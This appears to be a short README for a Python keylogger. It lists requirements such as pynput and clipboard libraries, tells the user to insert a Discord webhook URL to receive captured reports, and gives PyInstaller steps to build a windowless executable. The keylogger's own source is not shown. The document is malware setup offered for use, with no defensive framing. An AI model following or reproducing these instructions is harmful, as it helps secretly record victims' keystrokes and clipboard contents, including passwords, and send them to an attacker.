# Keylogger
Keylogger with Discord Webhooks reports

## Requirements
```py
pyinstaller
clipboard
pyperclip
requests
pynput
argparse
```

## Installation
Install requirements with
```batch
pip install -r requirements.txt
```
Makes changes to line 23 with your discord webhook
```python
webhook = "https://discord.com/api/webhooks/..."
```
Make the .exe file
```batch
cd into/current/folder/with/.py
pyinstaller -F -w "main.py"
```
File will be present in dist
```batch
  ..
  |__ build\
  |__ dist\
  |      |__ 'main.exe'    <------
  |__ main.py
  |__ main.spec
```
